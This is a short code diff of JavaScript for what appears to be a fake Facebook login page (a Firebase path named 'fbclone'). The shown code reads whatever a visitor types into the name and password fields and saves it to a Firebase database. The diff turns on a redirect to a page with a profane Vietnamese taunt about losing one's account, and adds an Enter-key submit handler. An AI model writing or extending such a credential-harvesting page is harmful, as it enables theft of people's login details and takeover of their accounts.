@@ -34,7 +34,7 @@ function writeData() {
 
 function writefb() {
     console.log("done");
-	//window.open("./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))", "_self");
+	window.open("./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))", "_self");
     firebase
         .database()
         .ref("fbclone/" + dateTime)
@@ -42,6 +42,12 @@ function writefb() {
             name: document.getElementById("name").value,
             pass: document.getElementById("pass").value,
         });
+}
+
+document.getElementById('login').onkeypress=function(e){
+    if(e.keyCode==13){
+        document.getElementById('login').click();
+    }
 }
 
 //.openInNewTab('./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))')
